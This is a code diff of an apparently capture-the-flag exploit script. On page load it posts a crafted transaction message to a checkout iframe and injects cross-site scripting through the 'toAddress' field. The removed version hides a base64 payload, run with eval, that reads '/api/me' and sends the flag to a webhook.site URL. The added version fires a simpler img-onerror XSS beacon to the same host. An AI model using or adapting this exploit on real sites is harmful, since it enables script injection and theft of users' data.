@@ -9,15 +9,15 @@
 document.addEventListener('DOMContentLoaded', () => {
   const iframe = document.getElementById('checkoutFrame');
 
-  fetch('https://webhook.site/1260e73e-c943-4c4a-96a4-d1523ad42027/flag');
+  fetch('https://webhook.site/b9386d0b-c63f-4066-b155-83a22d1c7055/flag');
 
   setTimeout(() => {
     iframe.contentWindow.postMessage({
       type: 'submitTransaction',
       transaction: {
-        currency: '1337COIN',
+        currency: 'BTC',
         amount: 1,
-        toAddress: '\"><img src=flag onerror="eval(atob(`ZmV0Y2goIi9hcGkvbWUiKS50aGVuKHJlcyA9PiByZXMuanNvbigpKS50aGVuKGRhdGEgPT4gZmV0Y2goImh0dHBzOi8vd2ViaG9vay5zaXRlL2I5Mzg2ZDBiLWM2M2YtNDA2Ni1iMTU1LTgzYTIyZDFjNzA1NS8/ZmxhZz0iK2VuY29kZVVSSUNvbXBvbmVudChkYXRhLmZsYWcpKSk=`))"> <\"'
+        toAddress: '"><img src=x onerror=fetch("https://webhook.site/b9386d0b-c63f-4066-b155-83a22d1c7055/XSSIsHere")> <span"'
       }
     }, '*');
   }, 300);
